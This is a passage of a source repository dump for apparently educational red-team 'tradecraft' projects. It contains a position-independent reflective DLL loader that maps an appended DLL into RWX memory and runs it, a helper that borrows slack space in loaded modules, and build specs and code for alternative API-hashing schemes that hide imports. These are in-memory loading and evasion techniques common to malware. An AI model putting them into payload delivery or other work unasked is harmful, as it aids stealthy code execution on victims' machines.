 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA (LPCSTR lpModuleName);

/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" "ror13" "KERNEL32, NTDLL" in loader.spec
 */

FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

/*
 * This is our default DFR resolver. It resolves Win32 APIs not handled by another resolver.
 */

FARPROC resolve_ext(char * mod, char * func) {
	HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
	if (hModule == NULL)
		hModule = LoadLibraryA(mod);

	return GetProcAddress(hModule, func);
}

/*
 * This is our opt-in function to help fix ptrs in x86 PIC. See fixptrs _caller" in loader.spec
 */

#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif

/*
 * find RW slackspace at the end of a .rdata section
 */
#define FLAG(x, y) ( ((x) & (y)) == (y) )

char * findDataCave(char * dllBase, int length) {
	DLLDATA                 data;
	DWORD                   numberOfSections;
	IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
	IMAGE_SECTION_HEADER  * sectionNxt       = NULL;

	/* parse our DLL! */
	ParseDLL(dllBase, &data);

	/* loop through our sections */
	numberOfSections = data.NtHeaders->FileHeader.NumberOfSections;
	sectionHdr       = (IMAGE_SECTION_HEADER *)PTR_OFFSET(data.OptionalHeader, data.NtHeaders->FileHeader.SizeOfOptionalHeader);
	for (int x = 0; (x + 1) < numberOfSections; x++) {
		/* look for our RW section! */
		if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_INITIALIZED_DATA)) {
			/* let's look at our next section, we need it to get the right size of the code cave */
			sectionNxt      = sectionHdr + 1;

			/* calculate the size, based on section headers */
			DWORD size      = sectionNxt->VirtualAddress - sectionHdr->VirtualAddress;

			/* calculate the size of our code cave */
			DWORD cavesize  = size - sectionHdr->Misc.VirtualSize;

			/* if we fit, return it */
			if (length < cavesize)
				return dllBase + (sectionNxt->VirtualAddress - cavesize);
		}

		/* advance to our next section */
		sectionHdr++;
	}

	return NULL;
}

/*
 * This is our opt-in fixbss function. The method here is to look for slack R/W space within various
 * loaded modules and use that for our .bss section. This is not compatible with multiple PICs being
 * resident in the same process space using this method--but it does do the job of giving us global
 * variables in our PIC.
 */

char * getBSS(DWORD length) {
	/* try in our module */
	HANDLE hModule = KERNEL32$GetModuleHandleA(NULL);
	char * ptr     = findDataCave(hModule, length);

	if (ptr != NULL)
		return ptr;

	/* try in kernel32 */
	hModule = KERNEL32$GetModuleHandleA("Kernel32");
	ptr     = findDataCave(hModule, length);
	if (ptr != NULL)
		return ptr;

	/* it's really bad news if we get here... ka-rash! */
	return NULL;
}

```

## File: simple_pic/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll/loader.spec

```text
#
# Simple Reflective DLL build spec
#

x86:
	# load our x86 .o file AND turn it into position-independent code
	load "bin/loader.x86.o"
		# +gofirst moves go() to position 0 of our PIC
		make pic +gofirst

		# OPT into x86 program fixes to allow data references without code hacks
		fixptrs "_caller"

		# OPT into PIC dynamic function resolution
		dfr "_resolve" "ror13"

		# merge the Tradecraft Garden Library into our PIC
		mergelib "../libtcg/libtcg.x86.zip"

		# load our Reflective DLL argument AND link it into our PIC as my_data section
		push $DLL
			link "my_data"
	
		# we're done, export the final blob
		export

x64:
	load "bin/loader.x64.o"
		make pic +gofirst

		dfr "resolve" "ror13"
		mergelib "../libtcg/libtcg.x64.zip"

		push $DLL
			link "my_data"

		export

```

## File: simple_rdll/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/loader.c -o bin/loader.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll/src/loader.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" "ror13" in loader.spec
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

/*
 * This is our opt-in function to help fix ptrs in x86 PIC. See fixptrs _caller" in loader.spec
 */
#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __DLLDATA__[0] __attribute__((section("my_data")));

char * findAppendedDLL() {
	return (char *)&__DLLDATA__;
}

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void go() {
	char       * dst;
	char       * src;
	DLLDATA      data;
	IMPORTFUNCS  funcs;

	/* find our DLL appended to this PIC */
	src = findAppendedDLL();

	/* parse our DLL! */
	ParseDLL(src, &data);

	/* allocate memory for it! */
	dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	/* load the damned thing */
	LoadDLL(&data, src, dst);

	/* setup our IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* process the imports */
	ProcessImports(&funcs, &data, dst);

	/* pass execution to our DLL */
	EntryPoint(&data, dst)((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
}

```

## File: simple_rdll/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_apihash/apihash.spec

```text
#
# Bring alternate API hashing into LibTCG's findModuleByHash and findFunctionByHash resolvers
#

djb2.x86:
	# load our implementation of our hash algo implementations onto the stack
	load "bin/apihash.x86.o"
		merge

	# opt into Dynamic Function resolution and pass DJB2 hashes to our _resolve function
	dfr "_resolve" "djb2"

	# redirect the ror13 local functions (in LibTCG) to our DJB2 implementations
	redirect "_hash_function" "_djb2_function"
	redirect "_hash_module"   "_djb2_module"

fnv1a.x86:
	load "bin/apihash.x86.o"
		merge

	dfr "_resolve" "fnv1a"

	redirect "_hash_function" "_fnv1a_function"
	redirect "_hash_module"   "_fnv1a_module"

joaat.x86:
	load "bin/apihash.x86.o"
		merge

	dfr "_resolve" "joaat"

	redirect "_hash_function" "_joaat_function"
	redirect "_hash_module"   "_joaat_module"

ror13.x86:
	dfr "_resolve" "ror13"

sdbm.x86:
	load "bin/apihash.x86.o"
		merge

	dfr "_resolve" "sdbm"

	redirect "_hash_function" "_sdbm_function"
	redirect "_hash_module"   "_sdbm_module"

#### x64 ####

djb2.x64:
	load "bin/apihash.x64.o"
		merge

	dfr "resolve" "djb2"

	redirect "hash_function" "djb2_function"
	redirect "hash_module"   "djb2_module"

fnv1a.x64:
	load "bin/apihash.x64.o"
		merge
	
	dfr "resolve" "fnv1a"

	redirect "hash_function" "fnv1a_function"
	redirect "hash_module"   "fnv1a_module"

joaat.x64:
	load "bin/apihash.x64.o"
		merge

	dfr "resolve" "joaat"

	redirect "hash_function" "joaat_function"
	redirect "hash_module"   "joaat_module"

ror13.x64:
	dfr "resolve" "ror13"

sdbm.x64:
	load "bin/apihash.x64.o"
		merge

	dfr "resolve" "sdbm"

	redirect "hash_function" "sdbm_function"
	redirect "hash_module"   "sdbm_module"


```

## File: simple_rdll_apihash/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_apihash/loader.spec

```text
#
# Simple Reflective DLL build spec
#
name        "Simple RDLL - API Hashing Demonstration"
describe    "Modular loader which demonstrates different API hashing techniques"
author      "Adversary Fan Fiction Writers Guild"
license     "BSD"
reference   "https://tradecraftgarden.org/simpleapi.html"

defenum     "%apihash" "API hashing algorithm" "djb2, fnv1a, joaat, ror13, sdbm" "ror13"
defraw      "$DLL"     "DLL capability"

x86:
	# load our x86 .o file AND turn it into position-independent code
	load "bin/loader.x86.o"
		# +gofirst moves go() to position 0 of our PIC
		# +optimize gets rid of unused functions (e.g., API hashing we didn't used)
		make pic +gofirst +optimize

		# OPT into x86 program fixes to allow data references without code hacks
		fixptrs "_caller"

		# OPT into PIC dynamic function resolution with the specific hash algorithm
		# %apihash must be one of: djb2, fvn1a, or sdbm
		call "apihash.spec" %apihash

		# merge the Tradecraft Garden Library into our PIC
		mergelib "../libtcg/libtcg.x86.zip"

		# load our Reflective DLL argument AND link it into our PIC as my_data section
		push $DLL
			link "my_data"
	
		# we're done, export the final blob
		export

x64:
	load "bin/loader.x64.o"
		make pic +gofirst +optimize

		call "apihash.spec" %apihash

		mergelib "../libtcg/libtcg.x64.zip"

		push $DLL
			link "my_data"

		export

```

## File: simple_rdll_apihash/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/loader.c -o bin/loader.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/apihash.c -o bin/apihash.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/apihash.c -o bin/apihash.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_apihash/src/apihash.c

```c
/*
 * Copyright 2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
#include <windows.h>

/*
 * djb2 hash algorithm by Dan Bernstein (comp.lang.c, 1991)
 * http://www.cse.yorku.ca/~oz/hash.html
 */
DWORD djb2_module(char * value, USHORT counter) {
	DWORD hash = 5381;

	do {
		hash  *= 33;
		if (*value >= 'a')
			hash += (BYTE)*value - 0x20;
		else
			hash += (BYTE)*value;

		value++;
	} while (--counter);

	return hash;
}

DWORD djb2_function(char * value) {
	DWORD hash = 5381;

	do {
		hash = (hash * 33) + (BYTE)*value;
		value++;
	} while (*value);

	return hash;
}

/*
 * FNV-1a 32-bit hash algorithm
 * Created by Glenn Fowler, Landon Curt Noll, and Phong Vo
 */
DWORD fnv1a_module(char * value, USHORT counter) {
	DWORD hash  = 0x811C9DC5;
	DWORD prime = 0x01000193;

	do {
		if (*value >= 'a')
			hash ^= (BYTE)*value - 0x20;
		else
			hash ^= (BYTE)*value;

		hash *= prime;

		value++;
	} while (--counter);

	return hash;
}

DWORD fnv1a_function(char * value) {
	DWORD hash  = 0x811C9DC5;
	DWORD prime = 0x01000193;

	do {
		hash ^= (BYTE)*value;
		hash *= prime;
		value++;
	} while (*value);

	return hash;
}

/*
